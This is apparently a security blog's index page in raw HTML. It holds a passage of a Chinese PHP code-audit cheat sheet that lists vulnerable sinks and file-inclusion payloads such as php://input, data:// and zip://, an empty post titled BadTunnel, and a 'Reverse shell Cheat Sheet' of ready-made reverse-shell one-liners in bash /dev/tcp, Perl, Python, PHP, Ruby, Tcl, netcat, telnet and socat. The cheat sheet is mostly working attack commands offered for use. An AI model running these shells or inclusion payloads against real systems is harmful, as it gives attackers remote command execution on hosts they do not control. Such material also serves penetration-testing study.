+<h4 id="3-header头跳转"><a href="#3-header头跳转" class="headerlink" title="3) header头跳转"></a>3) header头跳转</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Location: http://baidu.cn/&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h4 id="1-include-include-once-，require-require-once-本地文件包含"><a href="#1-include-include-once-，require-require-once-本地文件包含" class="headerlink" title="1) include()/include_once()，require()/require_once()本地文件包含"></a>1) include()/include_once()，require()/require_once()本地文件包含</h4><blockquote>
+<p><a href="http://www.domain.com/test.php?mod=phpinfo" target="_blank" rel="external">http://www.domain.com/test.php?mod=phpinfo</a></p>
+<p><a href="http://www.domain.com/test.php?mod=phpinfo.php%00" target="_blank" rel="external">http://www.domain.com/test.php?mod=phpinfo.php%00</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php</span><br><span class="line">    define(&quot;ROOT&quot;,dirname(__FILE__).&apos;/&apos;);</span><br><span class="line">    $mod = $_GET[&apos;mod&apos;];    //可控</span><br><span class="line">    include(ROOT.$mod.&apos;.php&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    //phpinfo.php</span><br><span class="line">    phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-allow-url-include远程文件包含"><a href="#2-allow-url-include远程文件包含" class="headerlink" title="2) allow_url_include远程文件包含"></a>2) allow_url_include远程文件包含</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#allow_url_fopen=On</span><br><span class="line">#allow_url_include=On</span><br><span class="line">remote.php?file=[http|https|ftp]://example.com/shell.txt</span><br><span class="line">remote.php?file=php://input     #POST: &lt;?php phpinfo();?&gt;</span><br><span class="line">remote.php?file=php://filter/convert.base64-encode/resource=webshell.php</span><br><span class="line">remote.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">remote.php?file=zip://D:/apache/www/htdocs/test.jpg#phpinfo.php     //phpinfo.php压缩命名为test.jpg</span><br></pre></td></tr></table></figure>
+<h4 id="3-bypass-file-include"><a href="#3-bypass-file-include" class="headerlink" title="3) bypass file include"></a>3) bypass file include</h4><blockquote>
+<p>include($file.’.php’);</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php  =&gt;  test.php%00</span><br><span class="line">/   =&gt; %2f</span><br></pre></td></tr></table></figure>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">fopen()</span><br><span class="line">read file()</span><br><span class="line">fread()</span><br><span class="line">fgetss()</span><br><span class="line">fgets()</span><br><span class="line">parse_ini_file()</span><br><span class="line">show_source()</span><br><span class="line">file()</span><br></pre></td></tr></table></figure>
+<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink()</span><br><span class="line">session_destroy()</span><br></pre></td></tr></table></figure>
+<h3 id="会话认证"><a href="#会话认证" class="headerlink" title="会话认证"></a>会话认证</h3><blockquote>
+<p>大多数情况下会出现在如下情况中</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cookie</span><br><span class="line">session</span><br><span class="line">oauth</span><br><span class="line">openid</span><br></pre></td></tr></table></figure>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">中间件解析</span><br><span class="line">move_uploaded_file()</span><br><span class="line">文件头 content-type验证绕过</span><br></pre></td></tr></table></figure>
+<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h4 id="1-eval-、assert"><a href="#1-eval-、assert" class="headerlink" title="1) eval()、assert()"></a>1) eval()、assert()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(&quot; phpinfo(); &quot;);?&gt;</span><br><span class="line">&lt;?php assert(&quot; phpinfo(); &quot;);?&gt;</span><br><span class="line">&lt;?php $a=&quot;$&#123;@phpinfo()&#125;&quot;;?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-preg-replace"><a href="#2-preg-replace" class="headerlink" title="2) preg_replace()"></a>2) preg_replace()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line">&lt;?php @preg_replace(&quot;//e&quot;,$_GET[&apos;shell&apos;],&quot;Access Denied&quot;);?&gt;    shell.php?shell=phpinfo()</span><br></pre></td></tr></table></figure>
+<h4 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3) call_user_func()"></a>3) call_user_func()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=assert</span><br><span class="line">    $a = $_GET[&apos;a&apos;];</span><br><span class="line">    call_user_func($a,&apos;phpinfo()&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="4-动态函数执行"><a href="#4-动态函数执行" class="headerlink" title="4) 动态函数执行"></a>4) 动态函数执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=assert&amp;b=phpinfo()</span><br><span class="line">    $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]); ///assert(phpinfo());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="5-命令执行函数"><a href="#5-命令执行函数" class="headerlink" title="5) 命令执行函数"></a>5) 命令执行函数</h4><blockquote>
+<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">popen( &apos;whoami &gt;&gt; 1.txt&apos;, &apos;r&apos; ); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="1-extract-函数"><a href="#1-extract-函数" class="headerlink" title="1) extract()函数"></a>1) extract()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖。</span><br><span class="line">语法</span><br><span class="line">　　extract(array,extract_rules,prefix)</span><br><span class="line">参数</span><br><span class="line">　　array 必需。规定要使用的输入。</span><br><span class="line">　　extract_rules</span><br><span class="line">　　　　·EXTR_OVERWRITE – 默认。如果有冲突，则覆盖已有的变量。</span><br><span class="line">　　　　·EXTR_SKIP – 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</span><br><span class="line">　　prefix 可选。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$size = &quot;large&quot;;</span><br><span class="line">$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;,</span><br><span class="line">                   &quot;size&quot;  =&gt; &quot;medium&quot;,</span><br><span class="line">                   &quot;shape&quot; =&gt; &quot;sphere&quot;);</span><br><span class="line">extract($var_array);</span><br><span class="line"></span><br><span class="line">echo &quot;$color, $size, $shape&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>输出</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blue, medium, sphere</span><br></pre></td></tr></table></figure>
+<h4 id="2-遍历初始化变量"><a href="#2-遍历初始化变量" class="headerlink" title="2) 遍历初始化变量"></a>2) 遍历初始化变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=test</span><br><span class="line">    $a=&apos;hi&apos;;</span><br><span class="line">    foreach($_GET as $key =&gt; $value) &#123;</span><br><span class="line">        $key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    print $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>输出</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hi</span><br></pre></td></tr></table></figure>
+<h4 id="3-parse-str-变量覆盖漏洞"><a href="#3-parse-str-变量覆盖漏洞" class="headerlink" title="3) parse_str()变量覆盖漏洞"></a>3) parse_str()变量覆盖漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">parse_str() 函数把查询字符串解析到变量中。</span><br><span class="line">语法</span><br><span class="line">　　parse_str(string,array)</span><br><span class="line">参数</span><br><span class="line">　　string 必需。规定要解析的字符串。</span><br><span class="line">　　array 可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;</span><br><span class="line">parse_str($str);</span><br><span class="line">echo $first;  // value</span><br><span class="line">echo $arr[0]; // foo bar</span><br><span class="line">echo $arr[1]; // baz</span><br><span class="line"></span><br><span class="line">parse_str($str, $output);</span><br><span class="line">echo $output[&apos;first&apos;];  // value</span><br><span class="line">echo $output[&apos;arr&apos;][0]; // foo bar</span><br><span class="line">echo $output[&apos;arr&apos;][1]; // baz</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="4-import-request-variables-变量覆盖漏洞"><a href="#4-import-request-variables-变量覆盖漏洞" class="headerlink" title="4) import_request_variables()变量覆盖漏洞"></a>4) import_request_variables()变量覆盖漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了register_globals，但又想用到一些全局变量，那么此函数就很有用。</span><br><span class="line">语法</span><br><span class="line">　　bool import_request_variables ( string types [, string prefix] )</span><br><span class="line">参数</span><br><span class="line">　　types指定需要导入的变量，可以用字母&apos;G&apos;、&apos;P&apos;和&apos;C&apos;分别表示 GET、POST 和 Cookie。注意这些字母的顺序，当使用&quot;GP&quot;时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</span><br><span class="line">　　prefix可选参数，作为变量名的前缀，置于所有被导入到全局作用域的变量之前。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span><br><span class="line">    echo &apos;GLOBALS &apos;.(int)ini_get(&quot;register_globals&quot;).&quot;n&quot;;</span><br><span class="line">    import_request_variables(&apos;GPC&apos;);</span><br><span class="line">    if ($_SERVER[&apos;REMOTE_ADDR&apos;] != &apos;10.1.1.1&apos;) die(&apos;Go away!&apos;);</span><br><span class="line">    echo &apos;Hello admin!&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="5-可变变量"><a href="#5-可变变量" class="headerlink" title="5) $$可变变量"></a>5) $$可变变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &apos;hello&apos;;</span><br><span class="line">$$a = &apos;world&apos;;  //相当于$hello = &apos;world&apos;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote>
+<p>一般情况下在挖掘XSS代码时寻找如下函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print</span><br><span class="line">print_r</span><br><span class="line">echo</span><br><span class="line">printf</span><br><span class="line">sprintf</span><br><span class="line">die</span><br><span class="line">var_dump</span><br><span class="line">var_export</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><blockquote>
+<p>假设开启了GPC 使用urldecode()、rawurldecode()时,开启GPC和addslashes是一样的效果</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/test.php?id=1%2527     ＃产生了注入相当于 %2527 ==&gt; %27 ==&gt; &apos;</span><br><span class="line">&lt;?php</span><br><span class="line">    $a = addslashes($_GET[&apos;p&apos;]);</span><br><span class="line">    $b = urldecode($a);</span><br><span class="line">    echo $a     #1%27</span><br><span class="line">    echo $b     #1&apos;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/22/BadTunnel-Vulnerability/" itemprop="url">
+                  BadTunnel Vulnerability
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-22T15:25:29+08:00" content="2016-06-22">
+              2016-06-22
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/19/Reverse-shell-Cheat-Sheet/" itemprop="url">
+                  Reverse shell Cheat Sheet
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-19T02:00:20+08:00" content="2016-06-19">
+              2016-06-19
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -l -vv -p &lt;PORT&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">&gt; exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">&gt; exec /bin/sh 0&lt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 1&gt;&amp;0 2&gt;&amp;0 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+<h3 id="TCLsh"><a href="#TCLsh" class="headerlink" title="TCLsh"></a>TCLsh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/tclsh</span><br><span class="line">set s [socket &lt;IP&gt; &lt;PORT&gt;];</span><br><span class="line">while &#123;42&#125; &#123;</span><br><span class="line">puts -nonewline $s &quot;shell&gt;&quot;;</span><br><span class="line">flush $s;</span><br><span class="line">gets $s c;</span><br><span class="line">set e &quot;exec $c&quot;;</span><br><span class="line">if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123;</span><br><span class="line">puts $s $r;</span><br><span class="line">&#125;</span><br><span class="line">flush $s;</span><br><span class="line">&#125;</span><br><span class="line">close $s;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; echo &apos;set s [socket &lt;IP&gt; &lt;PORT&gt;];while 42 &#123; puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;&apos; | tclsh</span><br></pre></td></tr></table></figure>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; perl -e &apos;use Socket;$i=&quot;&lt;IP&gt;&quot;;$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line">&gt; perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;IP&gt;:&lt;PORT&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br><span class="line">&gt; perl -MIO -e &quot;$c=new IO::Socket::INET(PeerAddr,&apos;&lt;IP&gt;:&lt;PORT&gt;&apos;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br><span class="line">&gt; ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;&lt;IP&gt;&quot;,&quot;&lt;PORT&gt;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br><span class="line">&gt; ruby -rsocket -e &quot;c=TCPSocket.new(&apos;&lt;IP&gt;&apos;,&apos;&lt;PORT&gt;&apos;);while(cmd=c.gets);IO.popen(cmd,&apos;r&apos;)&#123;|io|c.print io.read&#125;end&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;IP&gt; &lt;PORT&gt; -e /bin/bash</span><br><span class="line">/bin/nc.traditional &lt;IP&gt; &lt;PORT&gt; -e /bin/bash</span><br><span class="line">/bin/nc.traditional &lt;IP&gt; &lt;PORT&gt; -c /bin/bash</span><br></pre></td></tr></table></figure>
+<p>via mkfifo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|/bin/nc.openbsd &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br></pre></td></tr></table></figure></p>
+<p>via mknod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm -f x; mknod x p &amp;&amp; nc &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br><span class="line">&gt; rm -f x; mknod x p &amp;&amp; /bin/nc.openbsd &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure></p>
+<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet &lt;IP&gt; &lt;PORT1&gt; | /bin/bash | telnet &lt;IP&gt; &lt;PORT2&gt;</span><br></pre></td></tr></table></figure>
+<p>via mkfifo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br></pre></td></tr></table></figure></p>
+<p>via mknod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure></p>
+<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; socat tcp-connect:&lt;IP&gt;:&lt;PORT&gt; exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
